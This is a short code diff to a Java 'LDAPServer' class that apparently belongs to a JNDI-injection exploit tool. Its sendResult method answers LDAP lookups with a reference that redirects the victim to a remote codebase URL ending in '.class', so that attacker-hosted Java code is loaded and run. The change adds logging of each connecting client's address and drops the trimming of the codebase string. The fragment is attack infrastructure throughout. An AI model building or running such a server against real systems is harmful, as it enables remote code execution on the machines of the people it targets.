@@ -64,14 +64,12 @@ public  class  LDAPServer  {
         }
 
         protected  void  sendResult  (InMemoryInterceptedSearchResult result, String base, Entry e)  throws Exception {
+
+            System.out.println( "Received LDAP request from: " + result.getConnectedAddress());
+
             URL turl = new URL( this.codebase, this.codebase.getRef().replace( '.' , '/' ).concat( ".class" ));
             System.out.println( "Send LDAP reference result for " + base + " redirecting to " + turl);
             e.addAttribute( "javaClassName" , base );
-            String cbstring = this.codebase.toString();
-            int refPos = cbstring.indexOf( '#' );
-            if (refPos> 0 ) {
-                cbstring = cbstring.substring( 0 , refPos);
-            }
 
             String payload = "";
 
